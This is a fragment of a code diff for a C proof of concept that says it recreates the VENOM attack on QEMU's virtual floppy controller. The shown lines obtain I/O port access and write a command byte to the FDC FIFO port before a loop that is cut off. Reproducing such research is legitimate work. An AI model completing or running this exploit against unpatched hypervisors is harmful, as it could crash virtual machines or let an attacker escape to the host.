@@ -6,13 +6,13 @@ It's aim is to exploit and recreate possible Venom attack on QEMU before patch
 #define FIFO 0x3f5
 #define RDID 0x0a
 #define SPC_COMMAND 0x8e
-#define MAX_COUNT  50000000
+#define MAX_COUNT  600
 #define TEST_VAL  0x12
 int main(void){
         iopl(3);
-        ioperm(0x3f5, 1, 1);
+        ioperm(FIFO, 1, 1);
 	// printf("write spc_command to port\n");
-        outb(RDID, FIFO);
+        outb(SPC_COMMAND, FIFO);
         int i,j;
         j = 0;
         printf("into loop\n");
